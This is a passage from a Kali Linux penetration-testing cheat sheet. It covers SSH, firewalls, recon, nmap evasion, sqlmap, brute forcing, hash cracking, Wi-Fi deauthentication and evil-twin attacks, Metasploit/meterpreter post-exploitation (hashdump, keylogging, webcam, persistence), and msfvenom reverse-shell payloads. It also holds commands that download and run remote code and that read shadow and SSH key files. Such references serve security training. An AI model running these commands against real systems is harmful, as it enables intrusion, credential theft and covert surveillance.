ssh -D 9050 user@host            # dynamic (SOCKS proxy)
ssh -X user@host                 # X11 forwarding
ssh -N -f -L 8080:localhost:80 user@host  # background
ssh -o StrictHostKeyChecking=no user@host
ssh -J jumphost user@target      # jump host
ssh -v user@host                 # verbose (debug)
ssh -q user@host                 # quiet
```

### scp — Secure Copy
```bash
scp file.txt user@192.168.1.1:/tmp/
scp user@192.168.1.1:/tmp/file.txt ./
scp -r directory/ user@192.168.1.1:/tmp/
scp -P 2222 file.txt user@host:/tmp/
scp -i key.pem file.txt user@host:/tmp/
```

### sftp — Secure FTP
```bash
sftp user@192.168.1.1
# put file.txt (upload)
# get file.txt (download)
# ls, cd, lcd, lls, mkdir
```

### rsync — Remote Sync
```bash
rsync -av source/ dest/          # sync directories
rsync -avz user@host:/src/ /dst/ # remote sync
rsync -avz --delete src/ dst/    # mirror (delete extra)
rsync -avz -e "ssh -p 2222" src/ user@host:/dst/
rsync --progress large_file.iso user@host:/tmp/
rsync -n src/ dst/               # dry run
```

### ssh-keygen — Generate SSH Keys
```bash
ssh-keygen -t rsa -b 4096
ssh-keygen -t ed25519            # modern key type
ssh-keygen -t rsa -b 4096 -f ~/.ssh/mykey
ssh-keygen -t rsa -b 4096 -C "kali@machine"
```

### ssh-copy-id — Copy Key to Server
```bash
ssh-copy-id user@192.168.1.1
ssh-copy-id -i ~/.ssh/id_rsa.pub user@192.168.1.1
ssh-copy-id -p 2222 user@192.168.1.1
```

### ssh-agent / ssh-add
```bash
eval $(ssh-agent)
ssh-add ~/.ssh/id_rsa
ssh-add -l                       # list loaded keys
ssh-add -d ~/.ssh/id_rsa         # remove key
```

### sshd — SSH Server
```bash
systemctl start ssh
systemctl stop ssh
systemctl enable ssh
systemctl status ssh
/etc/ssh/sshd_config             # config file
sshd -T                          # test config
```

---

## 13. FIREWALL & IPTABLES

### iptables — Packet Filter
```bash
iptables -L                      # list rules
iptables -L -v -n                # verbose, numeric
iptables -F                      # flush all rules
iptables -F INPUT                # flush INPUT chain
iptables -P INPUT DROP           # set default policy
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow SSH
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Allow HTTP/HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Block IP
iptables -A INPUT -s 192.168.1.100 -j DROP

# Block port
iptables -A INPUT -p tcp --dport 8080 -j DROP

# NAT masquerading
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Port forwarding
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# Save and restore
iptables-save > /etc/iptables/rules.v4
iptables-restore < /etc/iptables/rules.v4

# Delete specific rule
iptables -D INPUT -p tcp --dport 80 -j ACCEPT

# Insert rule at position
iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT

# Log dropped packets
iptables -A INPUT -j LOG --log-prefix "DROPPED: "
```

### ufw — Uncomplicated Firewall
```bash
ufw enable
ufw disable
ufw status
ufw status verbose
ufw allow 22
ufw allow ssh
ufw allow 80/tcp
ufw allow from 192.168.1.0/24
ufw deny 8080
ufw delete allow 80
ufw reset
ufw logging on
```

### nftables — Modern Firewall
```bash
nft list ruleset
nft add table ip filter
nft add chain ip filter input { type filter hook input priority 0; }
nft add rule ip filter input tcp dport 22 accept
nft list tables
nft flush ruleset
```

---

## 14. SERVICE MANAGEMENT (SYSTEMCTL)

### systemctl — Service Control
```bash
systemctl start apache2
systemctl stop apache2
systemctl restart apache2
systemctl reload apache2         # reload config without restart
systemctl enable apache2         # start on boot
systemctl disable apache2
systemctl status apache2
systemctl is-active apache2
systemctl is-enabled apache2
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl list-unit-files        # all services
systemctl daemon-reload          # reload systemd config
systemctl mask apache2           # prevent starting
systemctl unmask apache2

# Common services in Kali
systemctl start ssh
systemctl start postgresql
systemctl start mysql
systemctl start apache2
systemctl start networking
```

### service — Legacy Service Control
```bash
service apache2 start
service apache2 stop
service apache2 restart
service ssh start
service --status-all             # list all services
```

---

## 15. RECONNAISSANCE & INFORMATION GATHERING

### theHarvester — Email/Domain OSINT
```bash
theHarvester -d example.com -b google
theHarvester -d example.com -b bing
theHarvester -d example.com -b linkedin
theHarvester -d example.com -b all -l 500
theHarvester -d example.com -b google -f results.html
```

### Maltego — Graphical OSINT (GUI)
```bash
maltego                          # launch GUI
```

### Recon-ng — Recon Framework
```bash
recon-ng
# Inside recon-ng:
# marketplace install all
# workspaces create myproject
# modules load recon/domains-hosts/hackertarget
# options set SOURCE example.com
# run
```

### dmitry — Deep Information Gathering
```bash
dmitry -w example.com            # whois
dmitry -s example.com            # subdomain search
dmitry -e example.com            # email search
dmitry -p 192.168.1.1            # port scan
dmitry -winsepo output.txt example.com  # full recon
```

### dnsenum — DNS Enumeration
```bash
dnsenum example.com
dnsenum --dnsserver 8.8.8.8 example.com
dnsenum -f /usr/share/wordlists/dnsenum.lst example.com
dnsenum --threads 5 example.com
```

### dnsrecon — DNS Recon
```bash
dnsrecon -d example.com
dnsrecon -d example.com -t axfr     # zone transfer
dnsrecon -d example.com -t brt -D wordlist.txt  # brute force
dnsrecon -r 192.168.1.0/24          # reverse lookup range
dnsrecon -d example.com -t std      # standard enumeration
```

### fierce — DNS Scanner
```bash
fierce --domain example.com
fierce --domain example.com --subdomains accounts admin mail
fierce --domain example.com --dns-servers 8.8.8.8
```

### subfinder — Subdomain Discovery
```bash
subfinder -d example.com
subfinder -d example.com -o subdomains.txt
subfinder -d example.com -v          # verbose
subfinder -dL domains.txt            # multiple domains
```

### amass — Attack Surface Mapping
```bash
amass enum -d example.com
amass enum -d example.com -o output.txt
amass enum -passive -d example.com
amass enum -active -d example.com
amass intel -d example.com
amass viz -d3 -d example.com
```

### shodan — Search Engine for Devices
```bash
shodan init YOUR_API_KEY
shodan search apache
shodan search --fields ip_str,port,org "apache"
shodan host 8.8.8.8
shodan count "nginx"
shodan download results.json "port:22 country:US"
shodan parse results.json
```

### maltego / spiderfoot / osrframework
```bash
spiderfoot -l 127.0.0.1:5001     # launch SpiderFoot web UI
spiderfoot -s example.com -t all # CLI scan
```

### Google Dorks (via CLI)
```bash
# Examples used with search engines
# site:example.com filetype:pdf
# inurl:admin site:example.com
# intitle:"index of" site:example.com
# "password" filetype:txt site:example.com
```

---

## 16. NETWORK SCANNING (NMAP)

### nmap — Network Mapper
```bash
# Basic Scans
nmap 192.168.1.1                 # default scan
nmap 192.168.1.0/24              # scan subnet
nmap 192.168.1.1-100             # IP range
nmap -iL hosts.txt               # scan from file
nmap scanme.nmap.org             # test host

# Host Discovery
nmap -sn 192.168.1.0/24          # ping sweep
nmap -Pn 192.168.1.1             # skip ping, assume up
nmap -PS22,80,443 192.168.1.1    # TCP SYN ping
nmap -PA80 192.168.1.1           # TCP ACK ping
nmap -PU 192.168.1.1             # UDP ping
nmap -PE 192.168.1.1             # ICMP echo
nmap --send-ip 192.168.1.0/24    # skip ARP

# Port Scanning
nmap -p 80 192.168.1.1           # single port
nmap -p 80,443,8080 192.168.1.1  # multiple ports
nmap -p 1-1000 192.168.1.1       # port range
nmap -p- 192.168.1.1             # all 65535 ports
nmap --top-ports 100 192.168.1.1 # top 100 ports
nmap -F 192.168.1.1              # fast scan (100 ports)

# Scan Types
nmap -sT 192.168.1.1             # TCP connect scan
nmap -sS 192.168.1.1             # TCP SYN (stealth) scan
nmap -sU 192.168.1.1             # UDP scan
nmap -sF 192.168.1.1             # FIN scan
nmap -sX 192.168.1.1             # Xmas scan
nmap -sN 192.168.1.1             # Null scan
nmap -sA 192.168.1.1             # ACK scan
nmap -sW 192.168.1.1             # Window scan
nmap -sM 192.168.1.1             # Maimon scan
nmap -sI zombie 192.168.1.1      # Idle/Zombie scan

# Service/Version Detection
nmap -sV 192.168.1.1             # service versions
nmap -sV --version-intensity 9 192.168.1.1
nmap -sC 192.168.1.1             # default scripts
nmap -A 192.168.1.1              # aggressive (OS+version+scripts)

# OS Detection
nmap -O 192.168.1.1              # OS detection
nmap -O --osscan-limit 192.168.1.0/24
nmap -O --osscan-guess 192.168.1.1

# Scripts (NSE)
nmap --script=default 192.168.1.1
nmap --script=vuln 192.168.1.1   # vulnerability scan
nmap --script=http-* 192.168.1.1 # all HTTP scripts
nmap --script=smb-vuln-* 192.168.1.1  # SMB vulns
nmap --script=ssl-enum-ciphers 192.168.1.1
nmap --script=ftp-anon 192.168.1.1   # check anon FTP
nmap --script=http-sql-injection 192.168.1.1
nmap --script=dns-brute --script-args dns-brute.domain=example.com 192.168.1.1
nmap --script banner 192.168.1.1     # grab banners
nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi 192.168.1.1
nmap -p 3306 --script mysql-info 192.168.1.1
nmap -p 445 --script smb-os-discovery 192.168.1.1

# Timing
nmap -T0 192.168.1.1             # paranoid (slowest, IDS evasion)
nmap -T1 192.168.1.1             # sneaky
nmap -T2 192.168.1.1             # polite
nmap -T3 192.168.1.1             # normal (default)
nmap -T4 192.168.1.1             # aggressive
nmap -T5 192.168.1.1             # insane (fastest)

# Output
nmap -oN output.txt 192.168.1.1  # normal output
nmap -oX output.xml 192.168.1.1  # XML output
nmap -oG output.grep 192.168.1.1 # grepable output
nmap -oA output 192.168.1.1      # all formats
nmap -v 192.168.1.1              # verbose
nmap -vv 192.168.1.1             # more verbose

# Evasion
nmap -f 192.168.1.1              # fragment packets
nmap --mtu 24 192.168.1.1        # set MTU
nmap -D RND:10 192.168.1.1       # decoy scan
nmap -D 192.168.1.5,192.168.1.6 192.168.1.1  # specific decoys
nmap -S spoofed_IP 192.168.1.1   # spoof source IP
nmap --source-port 53 192.168.1.1  # source port
nmap -sS --randomize-hosts 192.168.1.0/24
nmap --data-length 200 192.168.1.1  # append random data

# Common Full Scan Examples
nmap -sS -sV -sC -A -O -p- -T4 -oA fullscan 192.168.1.1
nmap -sn 192.168.1.0/24 -oG - | grep Up | cut -d' ' -f2
```

### masscan — Ultra-Fast Port Scanner
```bash
masscan -p80,443 192.168.1.0/24
masscan -p1-65535 192.168.1.1 --rate=1000
masscan -p22,80,443 --rate=10000 192.168.1.0/24
masscan --range 192.168.1.0/24 -p0-65535 --rate=100000
masscan -iL targets.txt -p80,443 --rate=1000
masscan -p80 192.168.1.0/24 -oX scan.xml
```

### unicornscan
```bash
unicornscan 192.168.1.1:1-65535
unicornscan -msf 192.168.1.1:p,0-65535  # TCP
unicornscan -mU 192.168.1.1:p,0-65535   # UDP
```

---

## 17. VULNERABILITY SCANNING

### Nikto — Web Vulnerability Scanner
```bash
nikto -h http://192.168.1.1
nikto -h http://192.168.1.1 -port 8080
nikto -h http://192.168.1.1 -ssl
nikto -h http://192.168.1.1 -o output.html -Format html
nikto -h http://192.168.1.1 -Tuning x 6    # specific tests
nikto -h http://192.168.1.1 -useproxy http://127.0.0.1:8080
nikto -h http://192.168.1.1 -id admin:password  # auth
nikto -h http://192.168.1.1 -evasion 1     # evasion technique
nikto -h hosts.txt                          # scan multiple
```

### OpenVAS / GVM — Vulnerability Scanner
```bash
gvm-setup                        # initial setup
gvm-start                        # start services
gvm-stop                         # stop services
gvm-check-setup                  # verify setup
# Access web UI at https://127.0.0.1:9392
```

### Lynis — Security Auditing
```bash
lynis audit system               # full audit
lynis audit system --quick       # quick scan
lynis show categories            # available categories
lynis audit --tests-from-group malware
lynis show details MALW-3274     # test details
```

### Nessus (manual install)
```bash
# Start Nessus service
systemctl start nessusd
# Access: https://localhost:8834
```

### Vulners NSE Script
```bash
nmap --script vulners 192.168.1.1
nmap --script vulners -sV 192.168.1.1
```

---

## 18. WEB APPLICATION TESTING

### Burp Suite (GUI)
```bash
burpsuite                        # launch
# Configure browser proxy: 127.0.0.1:8080
```

### OWASP ZAP
```bash
zaproxy                          # launch
owasp-zap                        # alternative command
```

### sqlmap — SQL Injection
```bash
sqlmap -u "http://site.com/page?id=1"
sqlmap -u "http://site.com/page?id=1" --dbs  # list DBs
sqlmap -u "http://site.com/page?id=1" -D dbname --tables
sqlmap -u "http://site.com/page?id=1" -D dbname -T tablename --dump
sqlmap -u "http://site.com/page?id=1" --level=5 --risk=3
sqlmap -u "http://site.com/page?id=1" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://site.com/" --forms  # auto-detect forms
sqlmap -r request.txt            # from Burp request file
sqlmap -u "http://site.com/page?id=1" --batch  # auto-answer
sqlmap -u "http://site.com/page?id=1" --os-shell  # OS shell
sqlmap -u "http://site.com/page?id=1" --sql-shell
sqlmap -u "http://site.com/page?id=1" --cookie="PHPSESSID=abc"
sqlmap -u "http://site.com/page?id=1" -p id  # specific parameter
sqlmap -u "http://site.com/" --data="user=1&pass=2" --method=POST
sqlmap -u "http://site.com/" --headers="X-Custom: value"
sqlmap -u "http://site.com/?id=1" --technique=U  # UNION only
sqlmap -u "http://site.com/?id=1" --dbms=mysql    # specify DBMS
sqlmap -u "http://site.com/?id=1" --passwords      # dump hashes
```

### dirb — Web Directory Scanner
```bash
dirb http://192.168.1.1
dirb http://192.168.1.1 /usr/share/wordlists/dirb/big.txt
dirb http://192.168.1.1 -o output.txt
dirb http://192.168.1.1 -X .php,.txt,.html   # extensions
dirb http://192.168.1.1 -r                   # non-recursive
dirb http://192.168.1.1 -z 100              # millisecond delay
dirb https://192.168.1.1 -a "Mozilla/5.0"   # custom agent
```

### gobuster — Directory/DNS Bruter
```bash
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://192.168.1.1 -w wordlist.txt -x php,html,txt
gobuster dir -u http://192.168.1.1 -w wordlist.txt -t 50  # threads
gobuster dns -d example.com -w subdomains.txt
gobuster vhost -u http://192.168.1.1 -w vhosts.txt
gobuster dir -u http://192.168.1.1 -w wordlist.txt -o output.txt
gobuster dir -u http://192.168.1.1 -w wordlist.txt -k  # skip TLS
gobuster dir -u http://192.168.1.1 -w wordlist.txt -b 301,302  # blacklist status
gobuster dir -u http://192.168.1.1 -w wordlist.txt -c "session=abc"
```

### ffuf — Fuzz Faster U Fool
```bash
ffuf -u http://192.168.1.1/FUZZ -w wordlist.txt
ffuf -u http://192.168.1.1/FUZZ -w wordlist.txt -e .php,.html
ffuf -u http://192.168.1.1/FUZZ -w wordlist.txt -mc 200,301
ffuf -u http://192.168.1.1/?FUZZ=test -w params.txt  # parameter fuzz
ffuf -u http://192.168.1.1/ -H "Host: FUZZ.example.com" -w vhosts.txt
ffuf -u http://192.168.1.1/FUZZ -w wordlist.txt -t 100 -o output.json
ffuf -u http://192.168.1.1/login -X POST -d "user=FUZZ&pass=test" -w users.txt
```

### wfuzz — Web Fuzzer
```bash
wfuzz -c -z file,wordlist.txt http://192.168.1.1/FUZZ
wfuzz -c -w wordlist.txt --hc 404 http://192.168.1.1/FUZZ
wfuzz -c -z file,users.txt -z file,passwords.txt http://192.168.1.1/login?user=FUZZ&pass=FUZ2Z
wfuzz -c --hc 404 -w wordlist.txt -u http://192.168.1.1/FUZZ.php
```

### whatweb — Web Fingerprinter
```bash
whatweb http://192.168.1.1
whatweb -a 3 http://192.168.1.1  # aggression level
whatweb --log-xml=output.xml http://192.168.1.1
whatweb -i hosts.txt
```

### WPScan — WordPress Scanner
```bash
wpscan --url http://wordpress.site
wpscan --url http://wordpress.site --enumerate u  # users
wpscan --url http://wordpress.site --enumerate p  # plugins
wpscan --url http://wordpress.site --enumerate t  # themes
wpscan --url http://wordpress.site --enumerate ap # all plugins
wpscan --url http://wordpress.site -U users.txt -P passwords.txt  # brute force
wpscan --url http://wordpress.site --api-token YOUR_TOKEN
```

### nuclei — Fast Vulnerability Scanner
```bash
nuclei -u http://192.168.1.1
nuclei -l targets.txt
nuclei -u http://192.168.1.1 -t templates/
nuclei -u http://192.168.1.1 -severity critical,high
nuclei -u http://192.168.1.1 -tags cve
nuclei -u http://192.168.1.1 -o output.txt
```

### XSStrike — XSS Scanner
```bash
xsstrike -u "http://site.com/page?param=value"
xsstrike -u "http://site.com/page?param=value" --crawl
xsstrike -u "http://site.com/" --data "param=value" -l 3
```

---

## 19. PASSWORD ATTACKS

### Hydra — Network Login Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
hydra -L users.txt -P pass.txt ssh://192.168.1.1
hydra -l admin -P pass.txt ftp://192.168.1.1
hydra -l admin -P pass.txt http-get://192.168.1.1
hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -l root -P pass.txt mysql://192.168.1.1
hydra -l admin -P pass.txt smb://192.168.1.1
hydra -l admin -P pass.txt rdp://192.168.1.1
hydra -L users.txt -P pass.txt -t 4 -vV -f ssh://192.168.1.1
hydra -l admin -P pass.txt -s 8080 http-get://192.168.1.1
hydra -l admin -P pass.txt -e nsr ssh://192.168.1.1  # try null,same,reverse
hydra -l admin -P pass.txt pop3://192.168.1.1
hydra -l admin -P pass.txt imap://192.168.1.1
hydra -l admin -P pass.txt smtp://192.168.1.1
hydra -l admin -P pass.txt telnet://192.168.1.1
```

### Medusa — Parallel Brute Force
```bash
medusa -h 192.168.1.1 -u admin -P pass.txt -M ssh
medusa -h 192.168.1.1 -U users.txt -P pass.txt -M ftp
medusa -h 192.168.1.1 -u admin -P pass.txt -M http
medusa -H hosts.txt -u admin -P pass.txt -M ssh
```

### Hashcat — Password Cracker
```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt      # MD5
hashcat -m 100 hash.txt rockyou.txt                          # SHA1
hashcat -m 1000 hash.txt rockyou.txt                         # NTLM
hashcat -m 1800 hash.txt rockyou.txt                         # SHA512crypt
hashcat -m 500 hash.txt rockyou.txt                          # MD5crypt
hashcat -m 1800 hash.txt rockyou.txt -r rules/best64.rule    # with rules
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a                     # brute force 6 chars
hashcat -m 0 hash.txt -a 1 wordlist1.txt wordlist2.txt        # combination
hashcat -m 0 hash.txt --show                                  # show cracked
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d                     # 6 digits
hashcat -m 0 hash.txt -a 3 --increment --increment-min 4 ?a?a?a?a?a?a?a?a
hashcat --example-hashes | grep -A1 "NTLM"                   # find hash mode

# Hash modes reference
# -m 0   = MD5
# -m 100 = SHA1
# -m 200 = MySQL323
# -m 300 = MySQL4+
# -m 500 = MD5crypt (Unix)
# -m 900 = MD4
# -m 1000 = NTLM
# -m 1400 = SHA256
# -m 1700 = SHA512
# -m 1800 = SHA512crypt (Unix)
# -m 3200 = bcrypt
# -m 5500 = NetNTLMv1
# -m 5600 = NetNTLMv2
```

### John the Ripper — Password Cracker
```bash
john hash.txt                    # auto-detect format
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=md5crypt hash.txt
john --format=ntlm hash.txt
john --rules --wordlist=rockyou.txt hash.txt  # with rules
john --incremental hash.txt      # brute force
john --show hash.txt             # show cracked
john --list=formats              # list all formats
john --status                    # check progress

# Utilities
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt                # crack Linux passwords
zip2john archive.zip > zip.hash
john zip.hash
pdf2john document.pdf > pdf.hash
john pdf.hash
rar2john archive.rar > rar.hash
john rar.hash
ssh2john id_rsa > ssh.hash
john ssh.hash
```

### CeWL — Custom Wordlist Generator
```bash
cewl http://example.com -w wordlist.txt
cewl http://example.com -d 2 -m 6 -w wordlist.txt  # depth 2, min length 6
cewl http://example.com --with-numbers -w wordlist.txt
cewl http://example.com -a -w wordlist.txt           # include meta data
```

### Crunch — Wordlist Generator
```bash
crunch 6 8 abcdefg123 -o wordlist.txt        # 6-8 char from charset
crunch 8 8 -t Password@@@@ -o wordlist.txt   # pattern
crunch 6 6 0123456789 -o numbers.txt         # 6-digit numbers
crunch 4 4 -f /usr/share/crunch/charset.lst lalpha -o alpha.txt
crunch 10 10 -t @@@@@@1234 > combos.txt      # specific pattern
```

### fcrackzip — Zip Password Cracker
```bash
fcrackzip -u -D -p rockyou.txt archive.zip
fcrackzip -u -b -c aA1 -l 4-6 archive.zip   # brute force
```

### Mimikatz (via wine or post-exploit)
```bash
# Often used post-exploitation via Metasploit
# meterpreter> load kiwi
# meterpreter> creds_all
# meterpreter> lsa_dump_sam
```

---

## 20. WIRELESS ATTACKS

### aircrack-ng Suite
```bash
# Put interface in monitor mode
airmon-ng start wlan0
airmon-ng stop wlan0mon
airmon-ng check kill              # kill interfering processes

# Scan for networks
airodump-ng wlan0mon
airodump-ng --band a wlan0mon     # 5GHz
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Deauth attack (force handshake)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
aireplay-ng --deauth 0 -a AP_MAC -c CLIENT_MAC wlan0mon  # target specific client

# Crack WPA handshake
aircrack-ng handshake.cap -w rockyou.txt
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF handshake*.cap

# WEP cracking
aireplay-ng -1 0 -a AP_MAC wlan0mon    # fake auth
aireplay-ng -3 -b AP_MAC wlan0mon      # ARP replay
aircrack-ng wep_capture.cap            # crack WEP

# Packet injection test
aireplay-ng --test wlan0mon

# Kismet
kismet -c wlan0mon
```

### hcxdumptool / hcxtools — Modern WiFi Capture
```bash
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=3
hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt
```

### Reaver — WPS Attack
```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345678 -vv  # specific PIN
wash -i wlan0mon                  # scan for WPS-enabled networks
```

### Wifite — Automated WiFi Attack
```bash
wifite                           # interactive
wifite --wpa                     # WPA only
wifite --wep                     # WEP only
wifite -e "NetworkName"          # specific network
wifite --crack --dict rockyou.txt
```

### Fern Wifi Cracker (GUI)
```bash
fern-wifi-cracker
```

### Evil Twin / Rogue AP
```bash
# Using hostapd-wpe
# Create fake AP
hostapd-wpe hostapd-wpe.conf

# Using airbase-ng
airbase-ng -a AA:BB:CC:DD:EE:FF --essid "FreeWiFi" -c 6 wlan0mon
```

---

## 21. EXPLOITATION (METASPLOIT)

### msfconsole — Main Interface
```bash
msfconsole                       # launch
msfconsole -q                    # quiet (no banner)
msfconsole -r script.rc          # run resource script
```

### Basic Metasploit Commands
```bash
# Inside msfconsole:

help                             # show help
version                          # show version
banner                           # show banner

# Search
search type:exploit platform:windows
search ms17-010
search eternalblue
search cve:2021
search name:smb

# Module usage
use exploit/windows/smb/ms17_010_eternalblue
use exploit/multi/handler
use auxiliary/scanner/smb/smb_ms17_010
use post/multi/recon/local_exploit_suggester

# Module info
info
show options
show advanced
show payloads
show targets

# Set options
set RHOSTS 192.168.1.1
set RPORT 445
set LHOST 192.168.1.100
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set THREADS 10
setg LHOST 192.168.1.100         # global set

# Execute
run
exploit
exploit -j                       # run as job
jobs                             # list jobs
kill 0                           # kill job
check                            # check if vulnerable

# Sessions
sessions                         # list sessions
sessions -i 1                    # interact with session
sessions -u 1                    # upgrade to meterpreter
sessions -k 1                    # kill session
sessions -K                      # kill all sessions

# Payloads
show payloads
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set PAYLOAD java/meterpreter/reverse_tcp
set PAYLOAD cmd/unix/reverse_bash
set PAYLOAD php/meterpreter/reverse_tcp

# Database
db_status
db_connect msf:password@localhost/msf
workspace                        # list workspaces
workspace -a myproject           # create workspace
hosts                            # list hosts
services                         # list services
vulns                            # list vulnerabilities
loot                             # list loot
db_nmap -sV 192.168.1.0/24      # nmap with DB integration
```

### meterpreter Commands
```bash
# Inside meterpreter:
sysinfo                          # system information
getuid                           # current user
getpid                           # current PID
ps                               # list processes
migrate 1234                     # migrate to PID
getsystem                        # attempt privilege escalation

# File system
pwd
ls
cd /tmp
download file.txt                # download to local
upload /local/file.exe C:\\      # upload to remote
cat file.txt
search -f passwords.txt
rm file.txt
mkdir newdir

# Network
ipconfig
arp
route
portfwd add -l 8080 -r 192.168.1.2 -p 80  # port forward

# Shell
shell                            # drop to system shell
execute -f cmd.exe -i            # execute and interact
execute -f cmd.exe -H -i -t      # hidden, interactive, new thread

# Post exploitation
hashdump                         # dump password hashes
load kiwi                        # load mimikatz
creds_all                        # dump all credentials
lsa_dump_sam
lsa_dump_secrets

# Keylogging
keyscan_start
keyscan_dump
keyscan_stop

# Screenshots
screenshot
screenshare                      # live screen

# Webcam
webcam_list
webcam_snap
webcam_stream

# Persistence
run persistence -h               # help
run persistence -S -U -X -P windows/meterpreter/reverse_tcp -L C:\\ -i 10 -p 4444 -r LHOST

# Pivoting
run post/multi/manage/shell_to_meterpreter
run auxiliary/server/socks_proxy SRVPORT=9050 VERSION=5

# Privilege escalation
use post/multi/recon/local_exploit_suggester
use exploit/windows/local/bypassuac
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

### msfvenom — Payload Generator
```bash
# List formats and payloads
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders

# Windows Payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell64.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll > shell.dll
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f vba > macro.vba
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ps1 > shell.ps1
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh-cmd > shell.cmd

# Linux Payloads
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell64.elf

# Web Payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.jsp
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war > shell.war

# Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 R > shell.apk

# macOS
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho > shell.macho

# Encoded
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe

# Listener setup
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j
```

---

## 22. POST EXPLOITATION

### LinPEAS / WinPEAS — Privilege Escalation Scripts
```bash
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh
./linpeas.sh -a                  # all checks
./linpeas.sh | tee output.txt

# LinEnum
./LinEnum.sh -t                  # thorough
./LinEnum.sh -e /tmp/export/     # export results

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

### Privilege Escalation — Linux
```bash
# Check SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null

# Check capabilities
getcap -r / 2>/dev/null

# Check sudo privileges
sudo -l

# Check writable files
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Check PATH abuse
echo $PATH
find / -name "*.sh" -writable 2>/dev/null

# Check environment variables
env
printenv

# Interesting files
cat /etc/passwd
cat /etc/shadow (if readable)
cat ~/.bash_history
cat ~/.ssh/id_rsa
find / -name "*.conf" 2>/dev/null | xargs grep -i password
find / -name "*.txt" 2>/dev/null | xargs grep -i password
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Running processes
ps aux
ps aux | grep root

# Network connections
netstat -antp
ss -antp

# World-writable scripts in cron
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
```

### PowerShell for Post-Exploitation (via Metasploit or shell)
```bash
# Check PowerShell version
powershell -c "$PSVersionTable"

# Bypass execution policy
powershell -ep bypass -c "command"
powershell -exec bypass -f script.ps1

# Common post-exploit one-liners
powershell -c "Get-LocalUser"
powershell -c "Get-LocalGroup"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.1.100/shell.exe','C:\shell.exe')"
```

---

## 23. FORENSICS & ANALYSIS

### Autopsy — Digital Forensics (GUI)
```bash
autopsy                          # launch web interface
# Access: http://localhost:9999/autopsy
```

### Sleuth Kit — CLI Forensics
```bash
fls -r image.dd                  # list files
icat image.dd 1234               # extract file by inode
fsstat image.dd                  # filesystem info
blkls image.dd                   # list unallocated blocks
mmls image.dd                    # partition table
istat image.dd 1234              # inode info
ffind image.dd 1234              # find filename by inode
```

### Volatility — Memory Forensics
```bash
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=Win7SP1x64 pslist
volatility -f memory.dmp --profile=Win7SP1x64 pstree
